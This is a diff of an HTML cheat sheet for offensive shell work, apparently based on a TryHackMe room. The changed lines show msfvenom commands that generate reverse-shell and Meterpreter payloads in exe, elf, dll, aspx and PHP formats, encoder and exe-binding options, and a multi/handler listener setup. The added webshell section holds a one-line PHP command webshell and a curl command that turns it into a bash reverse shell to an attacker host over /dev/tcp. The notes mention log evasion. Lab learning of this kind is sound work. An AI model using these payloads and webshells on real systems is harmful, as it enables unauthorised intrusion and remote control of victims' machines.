@@ -677,12 +677,12 @@ run</code><button class="copy">⧉</button></div>
         <p class="note">One tool to build a payload in any language/format. Payload name = <code class="inl">&lt;platform&gt;/&lt;arch&gt;/&lt;payload&gt;</code> e.g. <code class="inl">linux/x86/meterpreter/reverse_tcp</code>.</p>
         <span class="lbl">the template</span>
         <div class="cmd"><code>msfvenom <span class="fl">-p</span> PAYLOAD LHOST=tun0 LPORT=4444 <span class="fl">-f</span> FORMAT <span class="fl">-o</span> out.ext</code><button class="copy">⧉</button></div>
-        <span class="lbl">list what's available</span>
-        <div class="cmd"><code>msfvenom <span class="fl">-l</span> payloads | grep linux
+        <span class="lbl">list / inspect payloads</span>
+        <div class="cmd"><code>msfvenom <span class="fl">--list</span> payloads | grep linux | grep meterpreter
 msfvenom <span class="fl">--list</span> formats
-msfvenom <span class="fl">--list</span> encoders</code><button class="copy">⧉</button></div>
-        <p class="note"><code class="inl">-a</code> arch · <code class="inl">--platform</code> OS · <code class="inl">-p -</code> reads a custom payload from stdin. Always set <code class="inl">LHOST</code> to your VPN iface (<code class="inl">tun0</code>), not a NATed address.</p>
-        <p class="note" style="color:var(--faint)">📖 From THM <a href="https://tryhackme.com/room/shellgenerationdelivery" target="_blank" rel="noopener">Shell Generation &amp; Delivery</a>.</p>
+msfvenom <span class="fl">--info</span> windows/x64/shell/reverse_tcp   <span class="cm"># staged or stageless?</span></code><button class="copy">⧉</button></div>
+        <p class="note"><code class="inl">-a</code> arch · <code class="inl">--platform</code> OS · <code class="inl">-p -</code> reads a custom payload from stdin. Always set <code class="inl">LHOST</code> to your VPN/tunnel iface (<code class="inl">tun0</code>, or <code class="inl">ens5</code> on the AttackBox) — the IP is baked into the payload.</p>
+        <p class="note" style="color:var(--faint)">📖 From THM <a href="https://tryhackme.com/room/shellgenerationdelivery" target="_blank" rel="noopener">Shell Payload Generation &amp; Delivery</a>.</p>
       </div>
 
       <div class="card"><h3>Staged vs Stageless <span class="tag">read the name</span></h3>
@@ -692,7 +692,7 @@ msfvenom <span class="fl">--list</span> encoders</code><button class="copy">⧉<
         <span class="lbl">staged — slash, stager pulls the rest</span>
         <div class="cmd"><code>windows/x64/shell/reverse_tcp
 windows/x64/meterpreter/reverse_tcp</code><button class="copy">⧉</button></div>
-        <p class="note"><b>Stageless</b> (<code class="inl">shell_reverse_tcp</code>) = bigger, more reliable on flaky links, and a plain <code class="inl">nc -lvnp</code> catches it. <b>Staged</b> (<code class="inl">shell/reverse_tcp</code>) = tiny first stage that downloads the payload from your handler → needs <code class="inl">multi/handler</code> with the <b>exact same</b> PAYLOAD; a bare <code class="inl">nc</code> catches the stager but the session never forms.</p>
+        <p class="note"><b>Stageless</b> (<code class="inl">shell_reverse_tcp</code>) = bigger, more reliable on flaky links, and a plain <code class="inl">nc -lvnp</code> catches it. <b>Staged</b> (<code class="inl">shell/reverse_tcp</code>) = tiny first stage that downloads the payload from your handler → needs <code class="inl">multi/handler</code> with the <b>exact same</b> PAYLOAD; a bare <code class="inl">nc</code> catches the stager but the session never forms. Meterpreter follows the same rule: <code class="inl">meterpreter/reverse_tcp</code> (staged) vs <code class="inl">meterpreter_reverse_tcp</code> (stageless). The <code class="inl">_</code>/<code class="inl">/</code> tell isn't universal — <code class="inl">msfvenom --info</code> confirms it.</p>
       </div>
 
       <div class="card"><h3>Output formats <span class="tag">-f</span></h3>
@@ -701,8 +701,10 @@ windows/x64/meterpreter/reverse_tcp</code><button class="copy">⧉</button></div
         <div class="cmd"><code>-f exe   -o s.exe       <span class="cm"># windows</span>
 -f elf   -o s.elf       <span class="cm"># linux  (chmod +x)</span>
 -f macho -o s.macho</code><button class="copy">⧉</button></div>
+        <span class="lbl">dll injection</span>
+        <div class="cmd"><code>-f dll   -o s.dll       <span class="cm"># sideload / inject</span></code><button class="copy">⧉</button></div>
         <span class="lbl">web / scripts</span>
-        <div class="cmd"><code>-f asp / aspx / jsp / war   <span class="cm"># app servers</span>
+        <div class="cmd"><code>-f aspx / jsp / war         <span class="cm"># IIS / java app servers</span>
 -f raw -o s.php             <span class="cm"># php (prepend &lt;?php if absent)</span>
 -f psh -o s.ps1             <span class="cm"># powershell</span></code><button class="copy">⧉</button></div>
         <span class="lbl">raw shellcode for exploit dev</span>
@@ -712,9 +714,9 @@ windows/x64/meterpreter/reverse_tcp</code><button class="copy">⧉</button></div
       </div>
 
       <div class="card"><h3>Encoders &amp; bad chars <span class="tag">encode</span></h3>
-        <span class="lbl">encode N times</span>
-        <div class="cmd"><code>msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 \
- <span class="fl">-e</span> x86/shikata_ga_nai <span class="fl">-i</span> 10 -f exe -o s.exe</code><button class="copy">⧉</button></div>
+        <span class="lbl">encode N times (-i = iterations)</span>
+        <div class="cmd"><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 \
+ <span class="fl">-e</span> x64/xor <span class="fl">-i</span> 3 -f exe -o s.exe</code><button class="copy">⧉</button></div>
         <span class="lbl">strip bad characters</span>
         <div class="cmd"><code>msfvenom -p ... <span class="fl">-b</span> '\x00\x0a\x0d' -f c</code><button class="copy">⧉</button></div>
         <span class="lbl">embed in a real exe (template)</span>
@@ -722,18 +724,33 @@ windows/x64/meterpreter/reverse_tcp</code><button class="copy">⧉</button></div
         <p class="note">Encoding is <b>not</b> reliable AV evasion anymore (the stubs are signatured) — its real job is to <b>remove bad chars</b> (e.g. <code class="inl">\x00</code>) so shellcode survives an exploit. <code class="inl">-x</code>+<code class="inl">-k</code> binds the payload to a legit binary that still runs.</p>
       </div>
 
-      <div class="card"><h3>Web shells &amp; delivery <span class="tag">deliver</span></h3>
-        <p class="note">Generating the payload is half the job — it still has to reach the target and <b>get executed</b>.</p>
-        <span class="lbl">ready-made shells shipped with kali</span>
-        <div class="cmd"><code>ls /usr/share/webshells/        <span class="cm"># php aspx jsp cfm perl</span>
-/usr/share/webshells/php/php-reverse-shell.php   <span class="cm"># edit $ip/$port</span></code><button class="copy">⧉</button></div>
-        <span class="lbl">generate a php web shell</span>
-        <div class="cmd"><code>msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -f raw -o s.php</code><button class="copy">⧉</button></div>
-        <span class="lbl">host → deliver → trigger (listener first!)</span>
-        <div class="cmd"><code>python3 -m http.server 80            <span class="cm"># serve the payload</span>
-<span class="cm"># upload via file-upload / LFI / writable dir, or pull with wget/curl</span>
-<span class="cm"># then browse to it / run it to fire the shell back</span></code><button class="copy">⧉</button></div>
-        <p class="note">Match the catcher to the payload: stageless php/elf/exe → <code class="inl">nc -lvnp</code>; <code class="inl">meterpreter/*</code> or any <code class="inl">shell/…</code> staged payload → <code class="inl">multi/handler</code> with the same PAYLOAD/LPORT.</p>
+      <div class="card"><h3>multi/handler <span class="tag">catch staged</span></h3>
+        <p class="note">The only listener that speaks the staging/Meterpreter protocol. <b>PAYLOAD, LHOST, LPORT must match the payload exactly</b> — a <code class="inl">shell/reverse_tcp</code> handler won't catch a <code class="inl">shell_reverse_tcp</code> payload.</p>
+        <div class="cmd"><code>msfconsole -q
+use multi/handler
+set PAYLOAD windows/x64/shell/reverse_tcp
+set LHOST tun0
+set LPORT 4444
+exploit <span class="fl">-j</span>                 <span class="cm"># -j = background job</span></code><button class="copy">⧉</button></div>
+        <span class="lbl">manage sessions</span>
+        <div class="cmd"><code>sessions                    <span class="cm"># list</span>
+sessions <span class="fl">-i</span> 1               <span class="cm"># interact with session 1</span>
+jobs                        <span class="cm"># list running handlers</span></code><button class="copy">⧉</button></div>
+        <p class="note">Ctrl+Z / <code class="inl">background</code> drops a session to the console. Ports &lt;1024 need <code class="inl">sudo</code>. LHOST must be the interface IP, never <code class="inl">0.0.0.0</code>. Payload fires but nothing lands? → check PAYLOAD/LHOST/LPORT match + firewall on LPORT.</p>
+      </div>
+
+      <div class="card"><h3>Webshells <span class="tag">over http</span></h3>
+        <p class="note">Server-side script that runs commands via HTTP — the move when a file-upload exists or outbound shells are firewalled (traffic looks like normal web).</p>
+        <span class="lbl">minimal php — <code class="inl">?cmd=</code></span>
+        <div class="cmd"><code>&lt;?php echo "&lt;pre&gt;".shell_exec($_GET["cmd"])."&lt;/pre&gt;"; ?&gt;</code><button class="copy">⧉</button></div>
+        <span class="lbl">run it</span>
+        <div class="cmd"><code>http://TARGET/uploads/shell.php?cmd=id   <span class="cm"># POST var is quieter in logs</span></code><button class="copy">⧉</button></div>
+        <span class="lbl">pre-made (kali) · also IIS/java</span>
+        <div class="cmd"><code>/usr/share/webshells/php/php-reverse-shell.php   <span class="cm"># PentestMonkey — edit $ip/$port</span>
+<span class="cm"># .aspx → IIS/ASP.NET · .jsp/.war → java app servers</span></code><button class="copy">⧉</button></div>
+        <span class="lbl">upgrade webshell → real reverse shell</span>
+        <div class="cmd"><code>curl "http://TARGET/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'"</code><button class="copy">⧉</button></div>
+        <p class="note">Catch it on <code class="inl">nc -lvnp 4444</code> (start it first). <code class="inl">curl</code> URL-encodes for you; in a browser the payload must be URL-encoded or spaces/<code class="inl">&gt;</code>/<code class="inl">&amp;</code> truncate it. Clean up the webshell after — never leave a backdoor in production.</p>
       </div>
     </div></div>
   </section>
